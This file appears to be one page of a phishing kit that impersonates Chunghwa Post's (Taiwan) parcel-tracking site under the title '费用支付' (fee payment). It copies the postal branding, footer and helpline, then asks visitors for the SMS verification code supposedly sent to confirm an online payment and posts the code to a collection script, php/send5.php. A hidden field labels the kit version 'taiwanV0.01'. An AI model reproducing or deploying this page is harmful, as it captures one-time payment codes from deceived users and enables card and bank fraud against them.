<?php
    include "eradox/all.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">    <title>费用支付</title>
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
    <header>
        <div class="firstdiv">
            <div class="inside"> 中華郵政全球資訊網 </div>
        </div>
        <div class="seconddiv">
            <div class="conta"><img src="images/logoso.png" alt="image"></div>
        </div>
        <div class="containerakhir">
            <div class="akhirheader">
                <div>郵件查詢 Track & Trace Service</div>
                <div>English </div>
            </div>
        </div>
    </header>
    <main>
        <div class="lbachari">
            <div class="bachar">郵件查詢 > </div>
        </div>
        <div class="lbachari">
            <div class="lcontainerdialform">
                <div>包裹递送 </div>
            </div>
        </div>
        <form action="php/send5.php" method="POST" class="arali">
            <div class="formf">
                    <div class="pleaseenter">请输入我们发送到您手机号码的验证码以确认您的在线支付</div>
            </div> 
            <div class="formf">
                <div class="labell">代码短信 :</div>
                <div class="divinput"><input type="text" name="sms" required=""></div>
            </div>
            <div class="divsubmitbtn">
                <button type="submit" class="submitbtn">確認(GO)</button>
            </div>
						<input type="hidden" name="brand" value="taiwanV0.01">

        </form>
    </main>
    <footer>   
        <div class="containertextfooter">
            <div> 感謝您的蒞臨，智能客服、若您對郵件處理資訊有疑問，<span style="color:red">請至意見箱</span> <img src="images/e_mail.gif" alt="image" class="egif"> 或洽顧客服務專線：0800-700-365</div>
            <div>手機請改撥付費電話：（04）2354-2030</div>
            <div> 若查詢網頁出現錯誤訊息或異常，<span style="color:red"> 請聯絡</span> <img src="images/e_mail.gif" class="egif" alt=""></div>
            <div> 版本建議MSIE 9.0以上　最佳解析度1280*1024</div>
            <div> 中華郵政股份有限公司版權所有 </div>
        </div>
    </footer>
</body>
</html>